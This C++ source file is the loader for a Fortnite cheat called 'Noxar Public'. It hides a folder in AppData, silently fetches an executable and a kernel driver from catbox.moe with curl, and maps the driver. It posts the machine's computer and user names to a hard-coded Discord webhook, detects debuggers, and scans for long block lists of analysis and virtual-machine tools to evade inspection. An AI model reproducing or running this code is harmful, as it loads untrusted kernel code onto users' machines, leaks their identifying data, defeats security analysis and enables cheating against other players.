#include "includes.hpp"
#include <iostream>
#include <thread>
#include <cstdlib>
#include <string>
#include <filesystem>
#include <ctime>
#include <windows.h>
#include <chrono>
#include <atomic>
#include <sstream>
#include <vector>
#include <algorithm>
#include <tlhelp32.h>

namespace fs = std::filesystem;

std::string g_tempFolder;
std::atomic<bool> driversLoaded(false);
const std::string DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1339913500721545237/_W2GqBAd8WYK8SDR9hQjNlBOiiVuAUjkCP_597pBHqWyEgG8_aeCgSjCNVw4lkIQSAL_";

std::vector<std::string> blacklistedPrograms = {
    "httpdebuggerui.exe",
    "wireshark.exe",
    "httpdebuggersvc.exe",
    "fiddler.exe",
    "regedit.exe",
    "vboxservice.exe",
    "df5serv.exe",
    "processhacker.exe",
    "vboxtray.exe",
    "vmtoolsd.exe",
    "vmwaretray.exe",
    "ida.exe",
    "ida64.exe",
    "ollydbg.exe",
    "pestudio.exe",
    "vmwareuser",
    "vgauthservice.exe",
    "vmacthlp.exe",
    "x96dbg.exe",
    "vmsrvc.exe",
    "x32dbg.exe",
    "vmusrvc.exe",
    "prl_cc.exe",
    "prl_tools.exe",
    "xenservice.exe",
    "qemu-ga.exe",
    "joeboxcontrol.exe",
    "ksdumperclient.exe",
    "ksdumper.exe",
    "joeboxserver.exe",
    // Additional cracking/decompiling tools:
    "cheatengine.exe",
    "cheatengine-x86_64.exe",
    "keygen.exe",
    "patcher.exe",
    "reclass.exe",
    "ghidra.exe",
    "dnspy.exe",
    "dnSpy.exe"
};

std::vector<std::string> blacklistedWindowNames = {
    "ida: quick start",
    "vboxtraytoolwndclass",
    "vboxtraytoolwnd",
    "proxifier",
    "graywolf",
    "extremedumper",
    "zed",
    "exeinfope",
    "titanhide",
    "ilspy",
    "x32dbg",
    "codecracker",
    "simpleassembly",
    "process hacker 2",
    "pc-ret",
    "http debugger",
    "centos",
    "process monitor",
    "ilspy",
    "reverse",
    "simpleassemblyexplorer",
    "de4dotmodded",
    "dojandqwklndoqwd-x86",
    "sharpod",
    "folderchangesview",
    "fiddler",
    "die",
    "pizza",
    "crack",
    "strongod",
    "ida -",
    "brute",
    "dump",
    "stringdecryptor",
    "wireshark",
    "debugger",
    "httpdebugger",
    "gdb",
    "kdb",
    "x64_dbg",
    "windbg",
    "x64netdumper",
    "petools",
    "scyllahide",
    "megadumper",
    "reversal",
    "ksdumper v1.1 - by equifox",
    "dbgclr",
    "hxd",
    "peek",
    "ollydbg",
    "ksdumper",
    "http",
    "wpe pro",
    "dbg",
    "httpanalyzer",
    "httpdebug",
    "phantom",
    "kgdb",
    "x32_dbg",
    "proxy",
    "mdbg",
    "wpe pro",
    "system explorer",
    "de4dot",
    "x64dbg",
    "x64netdumper",
    "protection_id",
    "charles",
    "pepper",
    "procmon64",
    "megadumper",
    "ghidra",
    "xd",
    "0harmony",
    "dojandqwklndoqwd",
    "hacker",
    "process hacker",
    "sae",
    "mdb",
    "harmony",
    "protection_id",
    "petools",
    "scyllahide",
    "x96dbg",
    "mitmproxy",
    "dbx",
    "sniffer",
    "http toolkit"
};

std::string toLower(const std::string& s) {
    std::string lower = s;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
    return lower;
}

void sendDiscordCrackEmbed(const std::string& eventDescription) {
    char* compNamePtr = nullptr; size_t compNameLen = 0;
    _dupenv_s(&compNamePtr, &compNameLen, "COMPUTERNAME");
    std::string compName = compNamePtr ? compNamePtr : "Unknown";
    if (compNamePtr) free(compNamePtr);

    char* userNamePtr = nullptr; size_t userNameLen = 0;
    _dupenv_s(&userNamePtr, &userNameLen, "USERNAME");
    std::string userName = userNamePtr ? userNamePtr : "Unknown";
    if (userNamePtr) free(userNamePtr);

    time_t now = time(nullptr);
    char timeBuffer[64];
    strftime(timeBuffer, sizeof(timeBuffer), "%Y-%m-%d %H:%M:%S", localtime(&now));

    std::ostringstream payload;
    payload << "{\"embeds\":[{"
        << "\"title\":\"Cracking Attempt Detected\","
        << "\"description\":\"" << eventDescription << "\","
        << "\"color\":16711680,"
        << "\"fields\":["
        << "{\"name\":\"Time\",\"value\":\"" << timeBuffer << "\",\"inline\":false},"
        << "{\"name\":\"Computer Name\",\"value\":\"" << compName << "\",\"inline\":false},"
        << "{\"name\":\"Username\",\"value\":\"" << userName << "\",\"inline\":false}"
        << "]"
        << "}]}";

    std::string cmd = "curl -H \"Content-Type: application/json\" -X POST -d '"
        + payload.str() + "' " + DISCORD_WEBHOOK_URL + " >nul";
    system(cmd.c_str());
}

std::string generateRandomString(size_t length) {
    static const char alphanum[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    std::string s;
    s.reserve(length);
    for (size_t i = 0; i < length; i++)
        s.push_back(alphanum[rand() % (sizeof(alphanum) - 1)]);
    return s;
}

void randomizeConsoleTitle() {
    while (true) {
        std::string newTitle = generateRandomString(16);
        SetConsoleTitleA(newTitle.c_str());
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
}

bool checkBlacklistedProcesses() {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return false;
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnap, &pe)) {
        do {
            std::string exeName = toLower(pe.szExeFile);
            for (const auto& bad : blacklistedPrograms) {
                if (exeName == toLower(bad)) {
                    CloseHandle(hSnap);
                    return true;
                }
            }
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return false;
}

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    if (!IsWindowVisible(hwnd)) return TRUE;
    char title[256];
    GetWindowTextA(hwnd, title, sizeof(title));
    std::string windowTitle = toLower(std::string(title));
    auto* blacklist = reinterpret_cast<std::vector<std::string>*>(lParam);
    for (const auto& bad : *blacklist) {
        if (windowTitle.find(toLower(bad)) != std::string::npos)
            return FALSE;
    }
    return TRUE;
}

bool checkBlacklistedWindows() {
    BOOL result = EnumWindows(EnumWindowsProc, reinterpret_cast<LPARAM>(&blacklistedWindowNames));
    return (result == FALSE);
}

void constantScanProtection() {
    while (true) {
        if (IsDebuggerPresent()) {
            sendDiscordCrackEmbed("Debugger detected via constant scan!");
            exit(1);
        }
        BOOL remoteDebugger = FALSE;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &remoteDebugger);
        if (remoteDebugger) {
            sendDiscordCrackEmbed("Remote debugger detected via constant scan!");
            exit(1);
        }
        if (checkBlacklistedProcesses() || checkBlacklistedWindows()) {
            sendDiscordCrackEmbed("Blacklisted program or window detected via constant scan!");
            exit(1);
        }
        Sleep(500);
    }
}

void SetConsoleColor(WORD color) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, color);
}

void SetConsoleTransparency(int transparency) {
    HWND hwnd = GetConsoleWindow();
    LONG style = GetWindowLong(hwnd, GWL_EXSTYLE);
    SetWindowLong(hwnd, GWL_EXSTYLE, style | WS_EX_LAYERED);
    SetLayeredWindowAttributes(hwnd, 0, (BYTE)transparency, LWA_ALPHA);
}

void cleanupTempFolder() {
    if (!g_tempFolder.empty() && fs::exists(g_tempFolder))
        fs::remove_all(g_tempFolder);
}

void antiProtection() {
    if (IsDebuggerPresent()) {
        sendDiscordCrackEmbed("Debugger detected on startup (IsDebuggerPresent).");
        exit(1);
    }
    BOOL remoteDebugger = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remoteDebugger);
    if (remoteDebugger) {
        sendDiscordCrackEmbed("Remote debugger detected on startup.");
        exit(1);
    }
}

void showDriversLoadedMessage() {
    const std::string green = "\033[1;32m", white = "\033[0m";
    std::cout << green << "[+] Successfully loaded Noxar Drivers , press [F1] to Load Noxar Public" << white << std::endl;
    Sleep(3000);
    system("cls");
}

void loadDriversAuto() {
    Beep(750, 300);
    system("taskkill /F /IM FortniteClient-Win64-Shipping.exe >nul 2>&1");
    char* appdata = nullptr; size_t len = 0;
    if (_dupenv_s(&appdata, &len, "APPDATA") != 0 || appdata == nullptr) return;
    std::string baseDir(appdata);
    free(appdata);
    std::string folder = baseDir + "\\Temp_1";
    g_tempFolder = folder;
    if (!fs::exists(folder)) {
        CreateDirectoryA(folder.c_str(), NULL);
    }
    SetFileAttributesA(folder.c_str(), FILE_ATTRIBUTE_HIDDEN);
    std::string command = "curl --silent https://files.catbox.moe/oh9flp.bin --output \"" + folder + "\\driver.exe\" >nul";
    system(command.c_str());
    command = "curl --silent https://files.catbox.moe/dg3jiq.sys --output \"" + folder + "\\driver.sys\" >nul";
    system(command.c_str());
    command = "\"" + folder + "\\mappa.exe\" \"" + folder + "\\driver.sys\" >nul 2>&1";
    system(command.c_str());
    driversLoaded = true;
    sendDiscordCrackEmbed("Noxar Drivers loaded on machine.");
}

void showCheatLoadedUI() {
    SetConsoleTitleA("Noxar Public ~ Developed By NoxarTM                                                     //////  .gg/noxar-ud  //////");
    SetConsoleTransparency(200);
    SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    SetConsoleColor(FOREGROUND_BLUE);
    system("cls");
    const std::string green = "\033[1;32m", white = "\033[0m";
    // Instead of "Waiting for Fortnite...", display only "[+] Please Open Fortnite" on a clean console.
    std::cout << green << "[+] Please Open Fortnite" << white << std::endl;
    // Poll for Fortnite:
    while (game_wnd == 0) {
        Sleep(1);
        processID = Driver::FindProcess(L"FortniteClient-Win64-Shipping.exe");
        game_wnd = get_process_wnd(processID);
        Sleep(1);
    }
    // When Fortnite is detected, have the system speak the message.
    system("powershell -Command \"Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('Noxar Public Injected');\"");
    system("cls");
    const std::string red = "\033[1;31m";
    std::cout << green << "[+] Successfully loaded Noxar Public, press [INSERT] to open Menu" << white << std::endl;
    std::cout << green << "[+] Dont close this CMD" << white << std::endl;
    std::cout << "[+] Product: " << red << "Noxar Public" << white << std::endl;
    std::cout << "[+] Status: " << green << "Undetected" << white << std::endl;
    sendDiscordCrackEmbed("Noxar Public injected on machine.");
}

void loadCheat() {
    if (!driversLoaded) {
        int result = MessageBoxA(NULL, "Have You Already Loaded Drivers?", "Load Cheat", MB_YESNO | MB_ICONQUESTION);
        if (result == IDNO) {
            loadDriversAuto();
            showDriversLoadedMessage();
            return;
        }
    }
    Beep(750, 300);
    if (MessageBoxA(NULL, "Click OK in lobby", "Load Cheat", MB_OK) == IDOK)
        showCheatLoadedUI();
}

int main() {
    atexit(cleanupTempFolder);
    antiProtection();
    srand((unsigned)time(NULL));
    std::thread titleThread(randomizeConsoleTitle);
    titleThread.detach();
    std::thread scanThread(constantScanProtection);
    scanThread.detach();
    SetConsoleTransparency(200);
    SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    SetConsoleColor(FOREGROUND_BLUE);
    system("cls");
    std::cout << "Enjoy Using Noxar Public\n";
    std::cout << R"(
_   _                       ____        _     _ _      
| \ | | _____  ____ _ _ __  |  _ \ _   _| |__ | (_) ___ 
|  \| |/ _ \ \/ / _` | '__| | |_) | | | | '_ \| | |/ __|
| |\  | (_) >  < (_| | |    |  __/| |_| | |_) | | | (__ 
|_| \_|\___/_/\_\__,_|_|    |_|    \__,_|_.__/|_|_|\___|
)" << std::endl;
    if (!input::init()) {
        std::cout << "The input was not initialized :(\n";
        Sleep(3000);
        exit(0);
    }
    bool exitMenu = false;
    while (!exitMenu) {
        system("cls");
        std::cout << "[+] Press F2 To Load Drivers" << std::endl;
        std::cout << "[+] Press F1 To Load Noxar Public" << std::endl;
        Sleep(10);
        if ((GetAsyncKeyState(VK_F2) & 0x8000) && !driversLoaded) {
            loadDriversAuto();
            showDriversLoadedMessage();
        }
        if (GetAsyncKeyState(VK_F1) & 0x8000) {
            loadCheat();
            exitMenu = true;
        }
    }
    if (!gui::init()) {
        std::cout << "The gui was not initialized :(\n";
        Sleep(3000);
        exit(0);
    }
    if (!Driver::Init()) {
        std::cout << "The driver was not initialized :(\n";
        Sleep(3000);
        exit(0);
    }
    if (!Driver::CR3()) {}
    uintptr_t Base = Driver::GetBase();
    if (!Base) {
        std::cout << "The driver couldn't get the base address\n";
        exit(0);
    }
    create_overlay();
    directx_init();
    render_loop();
    return 0;
}
